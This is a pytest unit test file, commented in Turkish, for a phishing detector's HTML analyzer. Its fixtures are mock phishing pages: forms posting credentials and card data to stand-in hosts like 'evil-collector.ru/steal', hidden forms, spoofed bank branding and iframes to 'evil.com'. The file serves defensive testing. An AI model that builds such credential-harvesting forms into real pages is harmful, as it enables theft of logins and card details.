"""
HTML Derin Analizi — Unit Tests (B1)
======================================
BeautifulSoup DOM analizi, BS4 kurulu olmalı.

pytest tests/test_html_analyzer.py -v
"""
import pytest
from modules.phishing_detector.visual_analyzer import analyze_html


# ── Yardımcı HTML şablonları ──────────────────────────────────────────────

def _html(body: str, title: str = "") -> str:
    title_tag = f"<title>{title}</title>" if title else ""
    return f"<html><head>{title_tag}</head><body>{body}</body></html>"


ZIRAAT_FAKE_URL = "https://ziraat-online.xyz"
ZIRAAT_REAL_URL = "https://www.ziraatbank.com.tr"
PAYPAL_FAKE_URL = "https://paypal-secure-login.tk"
CLEAN_URL = "https://myblog.com"


# ── 1. Çapraz-domain form action ──────────────────────────────────────────

class TestCrossDomainForm:
    def test_cross_domain_form_adds_penalty(self):
        html = _html('<form action="https://evil-collector.ru/steal"><input type="text"/></form>')
        result = analyze_html(html, "https://legit-looking.com")
        assert result["penalty"] >= 18
        assert any("farklı domain" in d for d in result["details"])

    def test_same_domain_form_no_penalty(self):
        html = _html('<form action="/login"><input type="text"/></form>')
        result = analyze_html(html, "https://legit.com")
        # Çapraz-domain yok → bu testten ceza gelmiyor (başka nedenle gelebilir)
        raw = result["html_analysis"]
        assert raw["cross_domain_forms"] == 0

    def test_multiple_cross_domain_forms_capped(self):
        forms = ''.join(
            f'<form action="https://steal{i}.ru/collect"><input/></form>'
            for i in range(5)
        )
        result = analyze_html(_html(forms), "https://victim.com")
        assert result["penalty"] <= 85  # max cap


# ── 2. Gizli formlar ──────────────────────────────────────────────────────

class TestHiddenForms:
    def test_display_none_form_detected(self):
        html = _html('<form style="display:none"><input name="password"/></form>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["hidden_forms"] >= 1
        assert any("gizli form" in d.lower() for d in result["details"])

    def test_visibility_hidden_form_detected(self):
        html = _html('<form style="visibility:hidden"><input/></form>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["hidden_forms"] >= 1

    def test_visible_form_not_flagged(self):
        html = _html('<form action="/login"><input type="password"/></form>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["hidden_forms"] == 0


# ── 3. Kredi kartı / CVV alanları ─────────────────────────────────────────

class TestCreditCardFields:
    def test_cvv_field_detected(self):
        html = _html('<input name="cvv" type="text"/>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["cc_fields"] >= 1
        assert any("kredi kartı" in d.lower() or "cvv" in d.lower() for d in result["details"])

    def test_card_number_field_detected(self):
        html = _html('<input name="card_number" type="text"/>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["cc_fields"] >= 1

    def test_expiry_field_detected(self):
        html = _html('<input name="card_expiry" placeholder="MM/YY"/>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["cc_fields"] >= 1

    def test_cc_penalty_scaled_by_field_count(self):
        html = _html(
            '<input name="card_number"/>'
            '<input name="cvv"/>'
            '<input name="expiry"/>'
        )
        single = analyze_html(_html('<input name="cvv"/>'), CLEAN_URL)
        multi = analyze_html(html, CLEAN_URL)
        assert multi["html_analysis"]["cc_fields"] == 3
        assert multi["penalty"] >= single["penalty"]

    def test_clean_input_no_cc_detection(self):
        html = _html('<input name="email" type="email"/><input name="username"/>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["cc_fields"] == 0


# ── 4. Marka → domain uyuşmazlığı ─────────────────────────────────────────

class TestBrandMismatch:
    def test_ziraat_on_fake_domain_detected(self):
        html = _html(
            '<h1>Ziraat Bankası Online Giriş</h1><form><input type="password"/></form>',
            title="Ziraat Bankası - Güvenli Giriş"
        )
        result = analyze_html(html, ZIRAAT_FAKE_URL)
        assert result["html_analysis"]["brand_mismatch"] == "ziraat"
        assert result["penalty"] >= 55
        assert any("ziraat" in d.lower() for d in result["details"])

    def test_ziraat_on_real_domain_no_mismatch(self):
        html = _html(
            '<h1>Ziraat Bankası Online Giriş</h1>',
            title="Ziraat Bankası"
        )
        result = analyze_html(html, ZIRAAT_REAL_URL)
        assert result["html_analysis"]["brand_mismatch"] is None

    def test_paypal_on_fake_domain_detected(self):
        html = _html(
            '<title>PayPal - Giriş Yap</title><h1>PayPal hesabınıza giriş yapın</h1>'
            '<form><input type="password"/></form>'
        )
        result = analyze_html(html, PAYPAL_FAKE_URL)
        assert result["html_analysis"]["brand_mismatch"] == "paypal"
        assert result["penalty"] >= 55

    def test_generic_page_no_mismatch(self):
        html = _html('<h1>Benim Blogum</h1><p>Hoş geldiniz!</p>', title="Blogum")
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["brand_mismatch"] is None


# ── 5. Şifre alanı ────────────────────────────────────────────────────────

class TestPasswordFields:
    def test_password_with_brand_mismatch_higher_penalty(self):
        with_brand = _html(
            '<title>Garanti BBVA Giriş</title>'
            '<form><input type="password"/></form>'
        )
        without_brand = _html('<form><input type="password"/></form>')
        r_brand = analyze_html(with_brand, "https://evil.xyz")
        r_clean = analyze_html(without_brand, CLEAN_URL)
        assert r_brand["penalty"] > r_clean["penalty"]

    def test_password_only_small_penalty(self):
        html = _html('<form><input type="password" name="pwd"/></form>')
        result = analyze_html(html, CLEAN_URL)
        assert result["html_analysis"]["password_inputs"] == 1
        assert result["penalty"] <= 15  # Tek başına çok büyük ceza olmamalı


# ── 6. Şüpheli iframe ─────────────────────────────────────────────────────

class TestSuspiciousIframe:
    def test_external_iframe_detected(self):
        html = _html('<iframe src="https://tracker.evil.com/track.html"></iframe>')
        result = analyze_html(html, "https://myforum.net")
        assert result["html_analysis"]["suspicious_iframes"] >= 1
        assert any("iframe" in d.lower() for d in result["details"])

    def test_same_domain_iframe_not_flagged(self):
        html = _html('<iframe src="/embedded/widget.html"></iframe>')
        result = analyze_html(html, "https://myforum.net")
        assert result["html_analysis"]["suspicious_iframes"] == 0


# ── 7. Harici favicon ─────────────────────────────────────────────────────

class TestFaviconExternal:
    def test_external_favicon_detected(self):
        html = '<html><head><link rel="icon" href="https://google.com/favicon.ico"/></head><body></body></html>'
        result = analyze_html(html, "https://phishing.xyz")
        assert result["html_analysis"]["favicon_external"] is True
        assert any("favicon" in d.lower() for d in result["details"])

    def test_relative_favicon_not_flagged(self):
        html = '<html><head><link rel="icon" href="/favicon.ico"/></head><body></body></html>'
        result = analyze_html(html, "https://mysite.com")
        assert result["html_analysis"]["favicon_external"] is False


# ── 8. Definitiveness flag ────────────────────────────────────────────────

class TestDefinitiveFlag:
    def test_high_penalty_sets_definitive(self):
        html = _html(
            '<title>Ziraat Bankası</title>'
            '<h1>Ziraat Bankası Giriş</h1>'
            '<form action="https://evil.ru/steal">'
            '<input type="password"/><input name="card_number"/><input name="cvv"/>'
            '</form>'
        )
        result = analyze_html(html, "https://ziraat-fake.xyz")
        assert result["penalty"] >= 65
        assert result["definitive"] is True

    def test_low_penalty_not_definitive(self):
        html = _html('<form><input type="password"/></form>')
        result = analyze_html(html, CLEAN_URL)
        assert result["definitive"] is False


# ── 9. Edge cases ─────────────────────────────────────────────────────────

class TestEdgeCases:
    def test_empty_html_returns_zero_penalty(self):
        result = analyze_html("", "https://test.com")
        assert result["penalty"] == 0
        assert result["details"] == []

    def test_none_html_returns_zero_penalty(self):
        result = analyze_html(None, "https://test.com")
        assert result["penalty"] == 0

    def test_penalty_never_exceeds_max(self):
        """En kötü senaryo bile 85'i geçmemeli."""
        html = _html(
            '<title>Ziraat Bankası PayPal Microsoft</title>'
            '<h1>Ziraat Bankası</h1>'
            '<form action="https://evil1.ru/steal" style="display:none">'
            '<input name="card_number"/><input name="cvv"/>'
            '<input name="expiry"/><input type="password"/>'
            '</form>'
            '<iframe src="https://evil2.tk/log.html"></iframe>'
        )
        result = analyze_html(html, "https://worst-case.xyz")
        assert result["penalty"] <= 85

    def test_result_structure_always_complete(self):
        result = analyze_html("<html><body>test</body></html>", "https://test.com")
        assert "penalty" in result
        assert "details" in result
        assert "definitive" in result
        assert "html_analysis" in result
        assert isinstance(result["details"], list)
        assert isinstance(result["penalty"], int)
        assert isinstance(result["definitive"], bool)

    def test_module_imports_clean(self):
        import modules.phishing_detector.visual_analyzer  # noqa
